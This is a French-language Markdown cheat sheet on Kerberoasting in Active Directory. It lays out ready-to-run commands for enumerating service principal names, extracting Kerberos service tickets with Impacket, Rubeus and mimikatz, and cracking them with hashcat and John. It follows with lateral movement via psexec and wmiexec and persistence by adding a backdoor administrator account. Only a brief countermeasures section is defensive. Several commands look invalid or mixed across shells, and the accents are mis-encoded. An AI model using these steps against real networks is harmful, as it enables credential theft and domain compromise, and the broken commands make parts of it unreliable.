---
title: Kerberoasting
date: "2025-07-15"
draft: false
---

# ðŸ”¥ Kerberoasting - Cheat Sheet

## ðŸŽ¯ Vue d'ensemble
Le Kerberoasting est une technique d'attaque Active Directory qui permet d'extraire et de cracker les tickets de service Kerberos pour obtenir des mots de passe en clair des comptes de service.

---

## ðŸ” DÃ©tection et Ã‰numÃ©ration

### Identification des Comptes de Service
```bash
# Ã‰numÃ©ration des comptes de service
# Pourquoi : Identifier les comptes de service qui peuvent Ãªtre attaquÃ©s
Get-ServiceAccount -Domain DOMAIN.LOCAL
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Ã‰numÃ©ration avec PowerView
# Pourquoi : Utiliser PowerView pour une Ã©numÃ©ration avancÃ©e
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
Get-NetUser -SPN | Where-Object {$_.serviceprincipalname -ne "$null"}
```

### Ã‰numÃ©ration des SPNs
```bash
# Lister tous les SPNs
# Pourquoi : Identifier les services avec des SPNs configurÃ©s
setspn -T DOMAIN.LOCAL -Q */*
setspn -T DOMAIN.LOCAL -Q */MSSQLSvc*

# Ã‰numÃ©ration avec LDAP
# Pourquoi : Utiliser LDAP pour une Ã©numÃ©ration directe
ldapsearch -H ldap://DC_IP -D "DOMAIN\USER" -w PASSWORD -b "DC=DOMAIN,DC=LOCAL" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

---

## ðŸ› ï¸ Outils d'Exploitation

### Impacket
```bash
# GetUserSPNs pour extraire les tickets
# Pourquoi : Extraire les tickets de service avec Impacket
GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request

# Extraction avec format spÃ©cifique
# Pourquoi : Extraire les tickets dans un format compatible avec Hashcat
GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast.txt
```

### Rubeus
```bash
# Kerberoasting avec Rubeus
# Pourquoi : Utiliser Rubeus pour l'extraction des tickets
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Kerberoasting ciblÃ©
# Pourquoi : Attaquer des comptes de service spÃ©cifiques
Rubeus.exe kerberoast /user:MSSQLSvc /outfile:mssql_kerberoast.txt

# Kerberoasting avec format Hashcat
# Pourquoi : Extraire dans un format optimisÃ© pour le cracking
Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat
```

### PowerShell
```powershell
# Script PowerShell pour Kerberoasting
# Pourquoi : Utiliser PowerShell pour l'extraction des tickets
$SPNs = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
foreach($SPN in $SPNs) {
    $ticket = Invoke-Kerberoast -Identity $SPN.SamAccountName
    $ticket | Out-File -FilePath "kerberoast.txt" -Append
}
```

---

## ðŸ”¥ Techniques d'Extraction

### Extraction Manuelle
```bash
# Demander un ticket de service
# Pourquoi : Forcer la gÃ©nÃ©ration d'un ticket de service
klist purge
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQLSERVER.DOMAIN.LOCAL"

# Extraire le ticket
# Pourquoi : Extraire le ticket depuis le cache Kerberos
klist
mimikatz # kerberos::list /export
```

### Extraction AutomatisÃ©e
```bash
# Script d'extraction automatique
# Pourquoi : Automatiser le processus d'extraction
for /f "tokens=1,2 delims= " %i in ('setspn -T DOMAIN.LOCAL -Q */* ^| find "CN="') do @echo %i %j

# Extraction avec formatage
# Pourquoi : Formater les tickets pour le cracking
GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request | grep -E "^\$krb5tgs" > kerberoast.txt
```

---

## ðŸ”§ Cracking des Tickets

### Hashcat
```bash
# Cracking avec Hashcat
# Pourquoi : Utiliser Hashcat pour cracker les tickets Kerberos
hashcat -m 13100 kerberoast.txt wordlist.txt

# Cracking avec rÃ¨gles
# Pourquoi : Appliquer des rÃ¨gles pour amÃ©liorer le cracking
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule

# Cracking avec masques
# Pourquoi : Utiliser des masques pour les mots de passe complexes
hashcat -m 13100 kerberoast.txt -a 3 ?u?l?l?l?l?d?d?d?d
```

### John the Ripper
```bash
# Cracking avec John
# Pourquoi : Utiliser John the Ripper pour cracker les tickets
john --wordlist=wordlist.txt kerberoast.txt
john --format=krb5tgs --wordlist=wordlist.txt kerberoast.txt

# Cracking avec rÃ¨gles
# Pourquoi : Appliquer des rÃ¨gles John pour amÃ©liorer le cracking
john --wordlist=wordlist.txt --rules kerberoast.txt
```

### Cracking DistribuÃ©
```bash
# Cracking avec plusieurs GPU
# Pourquoi : AccÃ©lÃ©rer le cracking avec plusieurs GPU
hashcat -m 13100 kerberoast.txt wordlist.txt -d 0,1,2,3

# Cracking distribuÃ© sur plusieurs machines
# Pourquoi : Distribuer le cracking sur plusieurs machines
hashcat -m 13100 kerberoast.txt wordlist.txt --distributed
```

---

## ðŸŽ¯ Techniques AvancÃ©es

### Kerberoasting Asynchrone
```bash
# Extraction asynchrone
# Pourquoi : Extraire les tickets sans bloquer l'exÃ©cution
GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast.txt &
```

### Kerberoasting avec DÃ©lÃ©gation
```bash
# Kerberoasting avec dÃ©lÃ©gation contrainte
# Pourquoi : Exploiter les dÃ©lÃ©gations pour accÃ©der Ã  d'autres services
Rubeus.exe kerberoast /user:DELEGATED_SERVICE /outfile:delegated_kerberoast.txt

# Kerberoasting avec dÃ©lÃ©gation non contrainte
# Pourquoi : Exploiter les dÃ©lÃ©gations non contraintes
Rubeus.exe kerberoast /user:TRUSTED_SERVICE /outfile:trusted_kerberoast.txt
```

### Kerberoasting avec Persistance
```bash
# Extraction pÃ©riodique
# Pourquoi : Extraire les tickets pÃ©riodiquement pour dÃ©tecter les changements
while($true) {
    GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast_$(Get-Date -Format "yyyyMMdd_HHmmss").txt
    Start-Sleep -Seconds 3600
}
```

---

## ðŸ” Post-Exploitation

### Utilisation des Credentials
```bash
# Connexion avec les credentials obtenus
# Pourquoi : Utiliser les mots de passe crackÃ©s pour accÃ©der aux services
psexec.py DOMAIN/SERVICE_ACCOUNT:PASSWORD@TARGET_IP
wmiexec.py DOMAIN/SERVICE_ACCOUNT:PASSWORD@TARGET_IP

# Connexion aux bases de donnÃ©es
# Pourquoi : AccÃ©der aux bases de donnÃ©es avec les credentials de service
mssqlclient.py DOMAIN/SERVICE_ACCOUNT:PASSWORD@SQL_SERVER
```

### Escalade de PrivilÃ¨ges
```bash
# VÃ©rification des privilÃ¨ges
# Pourquoi : VÃ©rifier les privilÃ¨ges du compte de service
whoami /priv
net user SERVICE_ACCOUNT

# Recherche de privilÃ¨ges Ã©levÃ©s
# Pourquoi : Identifier les comptes de service avec des privilÃ¨ges Ã©levÃ©s
Get-ADUser -Identity SERVICE_ACCOUNT -Properties MemberOf
```

### Persistance
```bash
# CrÃ©ation de comptes persistants
# Pourquoi : CrÃ©er des comptes persistants avec les privilÃ¨ges obtenus
net user eviluser EvilPass123! /add
net localgroup administrators eviluser /add

# Modification des SPNs
# Pourquoi : Modifier les SPNs pour maintenir l'accÃ¨s
setspn -S HTTP/EVIL_SERVER.DOMAIN.LOCAL eviluser
```

---

## ðŸ›¡ï¸ Contre-Mesures

### Configuration des Comptes de Service
```powershell
# Utilisation de comptes gÃ©rÃ©s de service (gMSA)
# Pourquoi : Utiliser des gMSA pour Ã©viter les mots de passe en clair
New-ADServiceAccount -Name "SQLService" -DNSHostName "SQLSERVER.DOMAIN.LOCAL"

# Configuration de mots de passe complexes
# Pourquoi : Utiliser des mots de passe complexes pour les comptes de service
Set-ADAccountPassword -Identity SERVICE_ACCOUNT -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "ComplexPassword123!" -Force)
```

### Surveillance et DÃ©tection
```powershell
# Surveillance des demandes de tickets
# Pourquoi : DÃ©tecter les tentatives de Kerberoasting
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} | Where-Object {$_.Message -like "*Kerberos*"}

# Surveillance des Ã©checs d'authentification
# Pourquoi : DÃ©tecter les tentatives de cracking
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | Where-Object {$_.Message -like "*SERVICE_ACCOUNT*"}
```

### Configuration Kerberos
```powershell
# Configuration des politiques Kerberos
# Pourquoi : Configurer les politiques pour limiter les attaques
# GPO: Computer Configuration > Windows Settings > Security Settings > Account Policies > Kerberos Policy
# "Maximum lifetime for service ticket" = 10 hours
# "Maximum lifetime for user ticket" = 10 hours
```

---

## ðŸ“š Ressources

- **HackTricks Kerberoasting** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
- **Impacket GetUserSPNs** : https://github.com/SecureAuthCorp/impacket
- **Rubeus** : https://github.com/GhostPack/Rubeus
- **Kerberoasting Cheat Sheet** : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting

---

_DerniÃ¨re mise Ã  jour : 15 juillet 2025_
